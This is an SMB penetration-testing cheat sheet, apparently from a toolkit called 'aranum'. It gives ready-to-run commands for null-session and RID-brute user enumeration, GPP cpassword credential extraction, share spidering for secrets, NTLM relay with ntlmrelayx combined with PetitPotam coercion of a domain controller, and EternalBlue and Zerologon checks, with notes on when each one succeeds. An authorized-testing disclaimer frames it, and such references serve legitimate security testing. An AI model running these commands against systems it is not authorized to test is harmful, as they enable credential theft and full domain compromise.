---
service: smb
title: SMB / CIFS
ports: 445, 139
aliases: cifs, samba, netbios-ssn
---

# SMB — quick wins

**When you see it:** 445/tcp open and `nxc smb H -u '' -p ''` returns `[+]` without
`ACCESS_DENIED` → null session active; or SMB signing reported as disabled/not-required →
NTLM relay is viable without any credential.

> Authorized testing only. Triage is read-only; steps marked ✏️ write to or coerce from
> the target — get sign-off before proceeding and document every action.

## Triage (read-only)
```sh
nxc smb H -u '' -p ''                         # null session probe; [+] = open
nxc smb H -u 'guest' -p '' --shares           # guest session + share listing
nmap -Pn -p445 --script smb-security-mode,smb2-security-mode H
smbclient -N -L //H                            # list shares; null session
```

## Quick wins

### Null-session / guest share listing and spidering
```sh
nxc smb H -u '' -p '' --shares --pass-pol --users
smbclient -N //H/SHARE                         # browse specific share
nxc smb H -u '' -p '' --spider SHARE --pattern ''
```
*Why:* Confirms readable/writable shares without credentials. SYSVOL is always worth
listing even authenticated — look for scripts and GPP XML files.

### RID-brute username harvest
```sh
nxc smb H -u '' -p '' --rid-brute 10000
enum4linux-ng -A -oJ ./e4l H
```
*Why:* RID cycling over the null/guest session enumerates domain users without valid
creds. Feed the resulting `_users.lst` into Kerberos attacks.

### Password policy dump
```sh
nxc smb H -u '' -p '' --pass-pol
```
*Why:* Reveals lockout threshold and observation window before you spray anything.
**Always check this before any credential attacks.**

### GPP cpassword (SYSVOL Groups.xml) ✏️
```sh
nxc smb H -u U -p P -d DOMAIN -M gpp_password
```
*Why:* Searches SYSVOL for XML files containing the `cpassword` attribute — encrypted
with a Microsoft-published AES key, trivially reversible. Yields plaintext domain
credentials when Group Policy Preferences were used to set passwords. Requires at least
a domain user. `standalones/windows/Get-GPPCPassword.ps1` is the on-host variant.

### Authenticated share spider ✏️
```sh
nxc smb H -u U -p P -d DOMAIN --spider_plus
smbmap -H H -u U -p P -d DOMAIN -R --depth 3
```
*Why:* Recursively lists and fingerprints every readable share — finds config files,
credentials, DB connection strings, backups.

### NTLM relay (signing disabled) ✏️
```sh
# Terminal A — capture and relay (target must have signing disabled/not-required)
impacket-ntlmrelayx -t smb://RELAY_TARGET -smb2support -c 'whoami /all'

# Terminal B — coerce DC auth via PetitPotam
python3 PetitPotam.py -u U -p P -d DOMAIN ATT DC
# Or: coercer.py -u U -p P -d DOMAIN --target DC --listener ATT
```
*Why:* Hosts with SMB signing disabled or not-required will accept relayed NTLM
authentication. Coercing a DC forces it to authenticate to ATT; that credential is
relayed to a signing-disabled target for SYSTEM access, SAM dump, or LDAP abuse. The
dispatcher flags relay candidates in `_relay_candidates.txt`.

### EternalBlue check (MS17-010) ✏️
```sh
nmap -Pn -p445 --script smb-vuln-ms17-010 H
```
*Why:* MS17-010 affects unpatched Windows 7 / Server 2008 R2 and enables unauthenticated
RCE. NSE reports `VULNERABLE` if susceptible — actual exploitation requires Metasploit
`exploit/windows/smb/ms17_010_eternalblue` or impacket `eternalblue.py` (separate
exploit step, mark ✏️).

### Zerologon check (CVE-2020-1472)
```sh
python3 zerologon_tester.py DC$ DC   # from dirkjanm/CVE-2020-1472
```
*Why:* Unpatched DCs allow unauthenticated reset of the DC machine account password via
the Netlogon protocol — instant domain compromise. **Check only, do not exploit without
explicit scope approval** (resetting breaks domain replication).

## aranum helpers
- `aranumtoolkit/network/enum-smb.sh` — produced this finding; runs nxc, enum4linux-ng,
  rpcclient, smbmap, nmap vuln scripts, and auto-flags relay candidates.
- `standalones/windows/Get-GPPCPassword.ps1` — on-host GPP cpassword extractor.
- `standalones/windows/Get-PetitPotamSignals.ps1` / `Test-CoercedAuth.ps1` — host-local
  coercion signal checks.
- `standalones/creds/spray-scheduler.py` — rate-limited credential spray (SMB/WinRM).
- `standalones/creds/hash-format.py` — normalize captured hashes to hashcat input.

## Gotchas
- `MESSAGE_SIGNING_REQUIRED` on the DC itself means relay to the DC won't work; relay
  to workstations instead (workstations rarely enforce signing).
- Null session enumeration is blocked by default on Windows Server 2019+; guest account
  disabled similarly — try `'a'` / `''` as user if `''`/`''` fails.
- `--spider_plus` can be very slow on large environments; scope with `--share SHARE`.
- EternalBlue NSE has false-positives on some patched hosts — correlate with OS version
  from `smb-os-discovery` or nxc output.
- Zerologon test from dirkjanm resets the machine account to an empty hash — **always
  restore immediately** via the companion restore script if you trigger it.

## Sources
- HackTricks `pentesting-smb`; NetExec wiki enumeration / null-sessions;
  0xdf SMB Enum Cheatsheet; PayloadsAllTheThings AD — NTLM Relay;
  PetitPotam — NTLM Relay to AD CS (pentestlab.blog); CVE-2020-1472 dirkjanm.
